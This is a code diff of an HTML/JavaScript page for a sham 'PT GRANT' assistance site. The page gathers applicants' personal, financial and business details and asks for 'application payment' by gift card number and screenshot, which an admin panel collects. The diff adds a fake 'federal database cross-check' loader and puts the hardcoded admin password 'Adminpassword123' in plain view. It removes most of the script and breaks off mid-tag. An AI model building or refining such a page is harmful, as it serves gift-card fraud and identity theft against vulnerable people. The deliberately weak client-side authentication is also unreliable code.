@@ -51,7 +51,7 @@
         </div>
     </header>
 
-    <!-- PUBLIC NAVIGATION BAR (ADMIN LINK HIDDEN) -->
+    <!-- NAVIGATION BAR (ADMIN PORTAL BUTTON) -->
     <nav class="bg-slate-900/90 backdrop-blur-md text-white border-b border-slate-800 py-3.5 px-4 shadow-xl sticky top-0 z-40">
         <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
             <div class="flex items-center gap-3">
@@ -64,6 +64,9 @@
                 </button>
                 <button onclick="openModal('statusModal')" class="bg-slate-800 hover:bg-slate-700 text-slate-200 px-4 py-2.5 rounded-lg text-xs font-bold flex items-center gap-2 border border-slate-700 transition">
                     <i class="fa-solid fa-folder-open text-amber-400"></i> Check Status
+                </button>
+                <button onclick="checkAdminAccess()" class="bg-slate-950 hover:bg-slate-900 text-amber-400 px-3.5 py-2.5 rounded-lg text-xs font-semibold flex items-center gap-2 border border-slate-800 transition shadow">
+                    <i class="fa-solid fa-lock text-amber-400"></i> /admin.php
                 </button>
             </div>
         </div>
@@ -407,25 +410,49 @@
 
     </main>
 
-    <!-- ADMIN LOGIN MODAL (PASSWORD REQUIRED: Adminpassword123) -->
+    <!-- ADMIN LOGIN MODAL (PASSWORD: Adminpassword123) -->
     <div id="adminLoginModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
         <div class="bg-slate-900 max-w-sm w-full rounded-2xl shadow-2xl p-6 relative border-2 border-amber-500">
             <button onclick="closeModal('adminLoginModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
             <div class="w-12 h-12 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-3 text-xl border border-amber-500/40">
                 <i class="fa-solid fa-user-shield"></i>
             </div>
-            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Access Control</h3>
-            <p class="text-xs text-slate-400 text-center mb-4">Enter password to unlock the administrative portal.</p>
+            <h3 class="text-xl font-bold text-white text-center mb-1">Admin Portal Access</h3>
+            <p class="text-xs text-slate-400 text-center mb-4">Enter password (<strong>Adminpassword123</strong>) to unlock.</p>
 
             <form onsubmit="handleAdminLogin(event)" class="space-y-4">
                 <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Admin Password *</label>
-                    <input type="password" id="adminPasswordInput" required placeholder="Enter Admin Password" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
+                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Password *</label>
+                    <input type="password" id="adminPasswordInput" required placeholder="Adminpassword123" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
                 </div>
                 <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-black py-3 rounded-xl transition shadow-lg">
-                    Authenticate Admin
+                    Login to Admin Portal
                 </button>
             </form>
+        </div>
+    </div>
+
+    <!-- 50-SECOND ROLLING LOADER / PROCESSING MODAL -->
+    <div id="loadingModal" class="hidden fixed inset-0 bg-slate-950/95 backdrop-blur-lg flex items-center justify-center p-4 z-50">
+        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-8 text-center border-2 border-amber-500 space-y-6">
+            <div class="w-20 h-20 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto text-3xl animate-spin border-4 border-amber-500 border-t-transparent shadow-lg">
+                <i class="fa-solid fa-circle-notch"></i>
+            </div>
+            <div class="space-y-2">
+                <h3 class="text-2xl font-black text-white">Processing Grant Application</h3>
+                <p class="text-xs text-slate-300">Running federal database cross-checks, credit evaluation, and eligibility verification...</p>
+            </div>
+            
+            <div class="space-y-2">
+                <div class="flex justify-between text-xs font-bold text-amber-400">
+                    <span id="loadingStepText">Connecting to Secure Registry...</span>
+                    <span id="loadingTimerText">50s</span>
+                </div>
+                <div class="w-full bg-slate-950 h-3 rounded-full overflow-hidden border border-slate-800">
+                    <div id="loadingProgressBar" class="bg-gradient-to-r from-amber-500 to-amber-300 h-full w-0 transition-all duration-1000"></div>
+                </div>
+            </div>
+            <p class="text-[10px] text-slate-500 italic">Please do not close this window or refresh your browser while verification is in progress.</p>
         </div>
     </div>
 
@@ -549,466 +576,4 @@
                     <h4 class="font-bold text-amber-400 text-base">Business Assistance Information</h4>
                     <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                         <div>
-                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Business Name</label>
-                            <input type="text" id="businessName" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">EIN / Tax ID</label>
-                            <input type="text" id="businessEin" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
-                        </div>
-                        <div>
-                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Annual Revenue ($)</label>
-                            <input type="text" id="businessRevenue" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2.5 text-white">
-                        </div>
-                    </div>
-                </div>
-
-                <button type="submit" class="w-full bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-slate-950 font-black py-4 rounded-xl text-lg shadow-xl transition">
-                    Submit Qualification Form
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <!-- TICKET GENERATED MODAL -->
-    <div id="ticketModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
-        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 text-center relative border-2 border-amber-500">
-            <div class="w-16 h-16 bg-amber-500/20 text-amber-400 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl border border-amber-500/40">
-                <i class="fa-solid fa-ticket"></i>
-            </div>
-            <h3 class="text-2xl font-black text-white">Application Submitted!</h3>
-            <p class="text-xs text-slate-400 mt-1">Write down your Ticket ID below.</p>
-
-            <div class="bg-slate-950 text-amber-400 font-mono text-3xl font-black py-4 rounded-xl my-4 tracking-widest border border-amber-500/40" id="generatedTicketId">
-                PTG-000000
-            </div>
-
-            <div class="bg-amber-500/10 text-amber-300 text-xs p-4 rounded-xl text-left font-medium mb-4 space-y-1 border border-amber-500/20">
-                <p class="font-bold text-amber-400"><i class="fa-solid fa-triangle-exclamation"></i> WRITE IT DOWN:</p>
-                <p>1. Keep your <strong>Ticket ID</strong> safe.</p>
-                <p>2. Use <strong>Ticket ID + Last Name</strong> to log into your status portal.</p>
-            </div>
-
-            <button onclick="closeModal('ticketModal'); openModal('statusModal');" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl transition">
-                Proceed to Status Dashboard
-            </button>
-        </div>
-    </div>
-
-    <!-- STATUS LOGIN MODAL -->
-    <div id="statusModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
-        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-slate-800">
-            <button onclick="closeModal('statusModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
-            <h3 class="text-xl font-bold text-white mb-1">Check Application Status</h3>
-            <p class="text-xs text-slate-400 mb-4">Enter your login credentials.</p>
-
-            <form onsubmit="handleStatusLogin(event)" class="space-y-4">
-                <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Ticket ID *</label>
-                    <input type="text" id="statusTicketInput" required placeholder="PTG-123456" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono uppercase">
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Applicant Last Name *</label>
-                    <input type="text" id="statusLastNameInput" required placeholder="Last Name" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white">
-                </div>
-                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
-                    Access Status Portal
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <!-- GIFT CARD PAYMENT MODAL -->
-    <div id="paymentModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-4 z-50">
-        <div class="bg-slate-900 max-w-md w-full rounded-2xl shadow-2xl p-6 relative border border-amber-500">
-            <button onclick="closeModal('paymentModal')" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl font-bold">&times;</button>
-            <h3 class="text-xl font-bold text-white mb-1 flex items-center gap-2">
-                <i class="fa-solid fa-gift text-amber-400"></i> Gift Card Application Payment
-            </h3>
-            <p class="text-xs text-slate-400 mb-4">Enter gift card number and upload gift card image or screenshot.</p>
-
-            <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
-                <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Gift Card Number *</label>
-                    <input type="text" id="payGiftCardNumber" required placeholder="Enter Gift Card Code / Number" class="w-full border border-slate-800 bg-slate-950 rounded-lg p-3 text-white font-mono">
-                </div>
-                <div>
-                    <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Gift Card Image or Screenshot *</label>
-                    <input type="file" id="payGiftCardImage" accept="image/*" required class="w-full border border-slate-800 bg-slate-950 rounded-lg p-2 text-xs text-slate-300">
-                </div>
-                <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-xl transition">
-                    Submit Gift Card & Screenshot
-                </button>
-            </form>
-        </div>
-    </div>
-
-    <!-- JAVASCRIPT LOGIC -->
-    <script>
-        let applications = JSON.parse(localStorage.getItem('pt_applications')) || [];
-        let currentApplicant = null;
-        let selectedAdminTicket = null;
-        let isAdminAuthenticated = false;
-
-        // Auto-detect admin path on load
-        window.addEventListener('DOMContentLoaded', () => {
-            if (window.location.pathname.endsWith('admin.php') || window.location.hash === '#admin.php') {
-                checkAdminAccess();
-            }
-        });
-
-        function checkAdminAccess() {
-            if (isAdminAuthenticated) {
-                renderAdminTable();
-                showSection('admin');
-            } else {
-                openModal('adminLoginModal');
-            }
-        }
-
-        function handleAdminLogin(e) {
-            e.preventDefault();
-            const pwd = document.getElementById('adminPasswordInput').value;
-            if (pwd === 'Adminpassword123') {
-                isAdminAuthenticated = true;
-                closeModal('adminLoginModal');
-                document.getElementById('adminPasswordInput').value = '';
-                renderAdminTable();
-                showSection('admin');
-            } else {
-                alert('Invalid Admin Password.');
-            }
-        }
-
-        function logoutAdmin() {
-            isAdminAuthenticated = false;
-            showSection('cards');
-        }
-
-        function saveStorage() {
-            localStorage.setItem('pt_applications', JSON.stringify(applications));
-        }
-
-        function showSection(sec) {
-            document.getElementById('assistanceCardsSection').classList.add('hidden');
-            document.getElementById('statusDashboardSection').classList.add('hidden');
-            document.getElementById('adminPortalSection').classList.add('hidden');
-
-            if (sec === 'cards') document.getElementById('assistanceCardsSection').classList.remove('hidden');
-            if (sec === 'status') document.getElementById('statusDashboardSection').classList.remove('hidden');
-            if (sec === 'admin') document.getElementById('adminPortalSection').classList.remove('hidden');
-        }
-
-        function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
-        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
-
-        function openApplyModal(assistanceType) {
-            document.getElementById('assistanceType').value = assistanceType;
-            document.getElementById('applyModalTitle').innerText = assistanceType;
-            toggleAssistanceFields();
-            openModal('applyModal');
-        }
-
-        function toggleAssistanceFields() {
-            const val = document.getElementById('assistanceType').value;
-            const biz = document.getElementById('businessFields');
-            if (val === 'Business Assistance') {
-                biz.classList.remove('hidden');
-            } else {
-                biz.classList.add('hidden');
-            }
-        }
-
-        function handleFormSubmit(e) {
-            e.preventDefault();
-            const ticketId = 'PTG-' + Math.floor(100000 + Math.random() * 900000);
-            
-            const newApp = {
-                ticketId: ticketId,
-                assistanceType: document.getElementById('assistanceType').value,
-                firstName: document.getElementById('firstName').value,
-                lastName: document.getElementById('lastName').value,
-                email: document.getElementById('email').value,
-                phone: document.getElementById('phone').value,
-                address1: document.getElementById('address1').value,
-                address2: document.getElementById('address2').value || 'N/A',
-                city: document.getElementById('city').value,
-                state: document.getElementById('state').value,
-                zip: document.getElementById('zip').value,
-                employmentStatus: document.getElementById('employmentStatus').value,
-                payFrequency: document.getElementById('payFrequency').value,
-                payAmount: document.getElementById('payAmount').value,
-                creditScore: document.getElementById('creditScore').value,
-                businessName: document.getElementById('businessName').value || 'N/A',
-                businessEin: document.getElementById('businessEin').value || 'N/A',
-                businessRevenue: document.getElementById('businessRevenue').value || 'N/A',
-                status: 'Under Review',
-                approvedAmount: 0,
-                pendingAmount: 0,
-                uploads: [],
-                messages: [{ sender: 'admin', text: 'Welcome to PT GRANT support! Your application entries are registered. How can we assist you today?', time: new Date().toLocaleTimeString() }]
-            };
-
-            applications.push(newApp);
-            saveStorage();
-
-            document.getElementById('generatedTicketId').innerText = ticketId;
-            document.getElementById('applicationForm').reset();
-            closeModal('applyModal');
-            openModal('ticketModal');
-        }
-
-        function handleStatusLogin(e) {
-            e.preventDefault();
-            const ticket = document.getElementById('statusTicketInput').value.trim().toUpperCase();
-            const lastName = document.getElementById('statusLastNameInput').value.trim().toLowerCase();
-
-            const found = applications.find(a => a.ticketId === ticket && a.lastName.toLowerCase() === lastName);
-
-            if (found) {
-                currentApplicant = found;
-                closeModal('statusModal');
-                renderApplicantDashboard();
-                showSection('status');
-            } else {
-                alert('Invalid Ticket ID or Last Name combination.');
-            }
-        }
-
-        function renderApplicantDashboard() {
-            if (!currentApplicant) return;
-
-            document.getElementById('dashApplicantName').innerText = `${currentApplicant.firstName} ${currentApplicant.lastName}`;
-            document.getElementById('dashTicketId').innerText = currentApplicant.ticketId;
-            document.getElementById('dashApprovedAmount').innerText = `$${Number(currentApplicant.approvedAmount).toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-            document.getElementById('dashPendingAmount').innerText = `$${Number(currentApplicant.pendingAmount).toLocaleString('en-US', {minimumFractionDigits: 2})}`;
-
-            const badge = document.getElementById('dashStatusBadge');
-            badge.innerText = currentApplicant.status;
-            badge.className = "inline-block px-5 py-2 rounded-full font-bold text-sm shadow-sm " + 
-                (currentApplicant.status === 'Approved' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40' : 'bg-amber-500/20 text-amber-400 border border-amber-500/40');
-
-            const msgBox = document.getElementById('applicantMessagesBox');
-            msgBox.innerHTML = currentApplicant.messages.map(m => `
-                <div class="p-3 rounded-xl text-xs ${m.sender === 'admin' ? 'bg-amber-500/10 border border-amber-500/30 text-amber-200' : 'bg-slate-900 border border-slate-800 text-slate-300'}">
-                    <div class="flex justify-between font-bold mb-1">
-                        <span>${m.sender === 'admin' ? 'PT GRANT Support Officer' : 'You'}</span>
-                        <span class="text-[10px] text-slate-500">${m.time}</span>
-                    </div>
-                    <p>${m.text}</p>
-                </div>
-            `).join('');
-            msgBox.scrollTop = msgBox.scrollHeight;
-
-            const upBox = document.getElementById('applicantUploadsList');
-            upBox.innerHTML = currentApplicant.uploads.length ? currentApplicant.uploads.map(u => `
-                <div class="flex justify-between bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-slate-300">
-                    <span><strong class="uppercase text-amber-400">[${u.category}]</strong> ${u.name}</span>
-                    <span class="text-slate-500 text-[10px]">${u.time}</span>
-                </div>
-            `).join('') : '<p class="text-slate-500 italic">No uploaded documents.</p>';
-        }
-
-        function sendApplicantChatMessage() {
-            const input = document.getElementById('applicantChatInput');
-            const text = input.value.trim();
-            if (!text || !currentApplicant) return;
-
-            currentApplicant.messages.push({
-                sender: 'applicant',
-                text: text,
-                time: new Date().toLocaleTimeString()
-            });
-
-            saveStorage();
-            input.value = '';
-            renderApplicantDashboard();
-
-            if (selectedAdminTicket === currentApplicant.ticketId) {
-                selectAdminApp(currentApplicant.ticketId);
-            }
-        }
-
-        function uploadDocument(category) {
-            const fileInput = document.getElementById(category === 'personal' ? 'personalDocInput' : 'businessDocInput');
-            if (!fileInput.files.length) return alert('Select a file to upload.');
-
-            const file = fileInput.files[0];
-            const reader = new FileReader();
-
-            reader.onload = function(e) {
-                currentApplicant.uploads.push({
-                    category: category,
-                    name: file.name,
-                    dataUrl: e.target.result,
-                    time: new Date().toLocaleTimeString()
-                });
-
-                saveStorage();
-                fileInput.value = '';
-                renderApplicantDashboard();
-                alert('Document uploaded to Admin Portal successfully!');
-            };
-
-            reader.readAsDataURL(file);
-        }
-
-        function handlePaymentSubmit(e) {
-            e.preventDefault();
-            const giftCardNumber = document.getElementById('payGiftCardNumber').value;
-            const fileInput = document.getElementById('payGiftCardImage');
-
-            if (!fileInput.files.length) return alert('Please attach a gift card screenshot or image.');
-
-            const file = fileInput.files[0];
-            const reader = new FileReader();
-
-            reader.onload = function(e) {
-                currentApplicant.uploads.push({
-                    category: 'gift card',
-                    name: `Gift Card (${giftCardNumber}): ${file.name}`,
-                    giftCardNumber: giftCardNumber,
-                    dataUrl: e.target.result,
-                    time: new Date().toLocaleTimeString()
-                });
-
-                currentApplicant.status = 'Payment Verified';
-                saveStorage();
-
-                closeModal('paymentModal');
-                renderApplicantDashboard();
-                alert('Gift card number and screenshot submitted to Admin Portal!');
-            };
-
-            reader.readAsDataURL(file);
-        }
-
-        function renderAdminTable() {
-            const tbody = document.getElementById('adminTableBody');
-            if (!applications.length) {
-                tbody.innerHTML = `<tr><td colspan="7" class="p-4 text-center text-slate-500">No applications submitted yet.</td></tr>`;
-                return;
-            }
-
-            tbody.innerHTML = applications.map(a => `
-                <tr class="hover:bg-slate-950/50">
-                    <td class="p-3 font-mono font-bold text-amber-400">${a.ticketId}</td>
-                    <td class="p-3">${a.firstName} ${a.lastName}</td>
-                    <td class="p-3">${a.assistanceType}</td>
-                    <td class="p-3"><span class="px-2.5 py-1 bg-amber-500/10 text-amber-400 rounded font-bold text-xs border border-amber-500/20">${a.status}</span></td>
-                    <td class="p-3 text-emerald-400 font-bold">$${Number(a.approvedAmount).toLocaleString()}</td>
-                    <td class="p-3 text-amber-400 font-bold">$${Number(a.pendingAmount).toLocaleString()}</td>
-                    <td class="p-3">
-                        <button onclick="selectAdminApp('${a.ticketId}')" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-3 py-1 rounded text-xs">
-                            Manage
-                        </button>
-                    </td>
-                </tr>
-            `).join('');
-        }
-
-        function selectAdminApp(ticketId) {
-            selectedAdminTicket = ticketId;
-            const app = applications.find(a => a.ticketId === ticketId);
-
-            document.getElementById('adminDetailCard').classList.remove('hidden');
-            document.getElementById('adminDetailTicketHeader').innerText = `Managing Application: ${app.ticketId}`;
-            document.getElementById('adminDetailAssistanceType').innerText = app.assistanceType;
-
-            document.getElementById('admFullName').innerText = `${app.firstName} ${app.lastName}`;
-            document.getElementById('admEmail').innerText = app.email;
-            document.getElementById('admPhone').innerText = app.phone;
-            document.getElementById('admAddress1').innerText = app.address1;
-            document.getElementById('admAddress2').innerText = app.address2;
-            document.getElementById('admCityStateZip').innerText = `${app.city}, ${app.state} ${app.zip}`;
-            document.getElementById('admEmployment').innerText = app.employmentStatus;
-            document.getElementById('admPay').innerText = `$${app.payAmount} (${app.payFrequency})`;
-            document.getElementById('admCredit').innerText = app.creditScore;
-
-            const bizBox = document.getElementById('admBusinessBox');
-            if (app.assistanceType === 'Business Assistance' || app.businessName !== 'N/A') {
-                bizBox.classList.remove('hidden');
-                document.getElementById('admBizName').innerText = app.businessName;
-                document.getElementById('admBizEin').innerText = app.businessEin;
-                document.getElementById('admBizRev').innerText = app.businessRevenue;
-            } else {
-                bizBox.classList.add('hidden');
-            }
-
-            document.getElementById('admStatusSelect').value = app.status;
-            document.getElementById('admApprovedInput').value = app.approvedAmount;
-            document.getElementById('admPendingInput').value = app.pendingAmount;
-
-            const chatBox = document.getElementById('adminChatMessagesBox');
-            chatBox.innerHTML = app.messages.map(m => `
-                <div class="p-2.5 rounded-lg text-xs ${m.sender === 'admin' ? 'bg-amber-500/10 text-amber-200' : 'bg-slate-900 text-slate-300 border border-slate-800'}">
-                    <div class="flex justify-between font-bold mb-1">
-                        <span>${m.sender === 'admin' ? 'Support Officer' : app.firstName}</span>
-                        <span class="text-[10px] text-slate-500">${m.time}</span>
-                    </div>
-                    <p>${m.text}</p>
-                </div>
-            `).join('');
-            chatBox.scrollTop = chatBox.scrollHeight;
-
-            const filesList = document.getElementById('admFilesList');
-            if (app.uploads.length) {
-                filesList.innerHTML = app.uploads.map(u => `
-                    <div class="p-3 bg-slate-950 border border-slate-800 rounded-xl space-y-2 text-slate-300">
-                        <div class="flex justify-between font-mono">
-                            <span><strong class="uppercase text-amber-400">[${u.category.toUpperCase()}]</strong> ${u.name}</span>
-                            <span class="text-slate-500 text-[10px]">${u.time}</span>
-                        </div>
-                        ${u.giftCardNumber ? `<div class="text-xs text-amber-300 font-bold">Gift Card Number: ${u.giftCardNumber}</div>` : ''}
-                        ${u.dataUrl ? `
-                            <div class="mt-2">
-                                <a href="${u.dataUrl}" target="_blank" class="inline-block bg-slate-800 hover:bg-slate-700 text-amber-400 font-bold px-3 py-1.5 rounded border border-slate-700 text-[11px] mb-2">
-                                    <i class="fa-solid fa-up-right-from-square"></i> Open Full File / Image
-                                </a>
-                                ${u.dataUrl.startsWith('data:image/') ? `<img src="${u.dataUrl}" class="max-h-48 rounded border border-slate-700 object-cover mt-1">` : ''}
-                            </div>
-                        ` : ''}
-                    </div>
-                `).join('');
-            } else {
-                filesList.innerHTML = '<p class="text-slate-500 italic">No uploaded documents or gift card screenshots available.</p>';
-            }
-        }
-
-        function saveAdminAppChanges() {
-            if (!selectedAdminTicket) return;
-            const app = applications.find(a => a.ticketId === selectedAdminTicket);
-
-            app.status = document.getElementById('admStatusSelect').value;
-            app.approvedAmount = parseFloat(document.getElementById('admApprovedInput').value) || 0;
-            app.pendingAmount = parseFloat(document.getElementById('admPendingInput').value) || 0;
-
-            saveStorage();
-            renderAdminTable();
-            alert('Application status & amounts saved successfully!');
-        }
-
-        function sendAdminChatMessage() {
-            if (!selectedAdminTicket) return;
-            const input = document.getElementById('adminChatInput');
-            const text = input.value.trim();
-            if (!text) return;
-
-            const app = applications.find(a => a.ticketId === selectedAdminTicket);
-            app.messages.push({
-                sender: 'admin',
-                text: text,
-                time: new Date().toLocaleTimeString()
-            });
-
-            saveStorage();
-            input.value = '';
-            selectAdminApp(selectedAdminTicket);
-
-            if (currentApplicant && currentApplicant.ticketId === selectedAdminTicket) {
-                renderApplicantDashboard();
-            }
-        }
-    </script>
-</body>
-</html>
+                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Business
